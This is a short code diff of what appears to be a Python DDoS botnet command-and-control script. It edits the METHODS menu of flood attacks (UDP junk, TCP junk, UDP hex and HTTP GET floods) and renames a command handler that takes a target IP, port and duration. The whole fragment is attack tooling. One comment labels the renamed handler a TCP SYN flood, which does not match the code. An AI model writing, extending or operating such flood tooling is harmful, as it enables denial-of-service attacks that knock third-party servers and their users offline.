@@ -119,9 +119,9 @@ def command_line(client):
                 send(client, '')
 
             elif command == 'METHODS':
-                send(client, '.cc: GET CC flood')
+                send(client, '.junk: UDP junk flood')
                 send(client, '.tcp: TCP junk flood')
-                send(client, '.udp: UDP junk flood')
+                send(client, '.udp: UDP normal flood')
                 send(client, '.hex: UDP hex flood')
                 send(client, '.http: HTTP GET request flood')
                 send(client, '')
@@ -157,7 +157,7 @@ def command_line(client):
                     send(client, 'Usage: .hex [IP] [PORT] [TIME]')
 
             # TCP SYNchronize flood           
-            elif command == '.CC':
+            elif command == '.JUNK':
                 if len(args) == 4:
                     ip = args[1]
                     port = args[2]
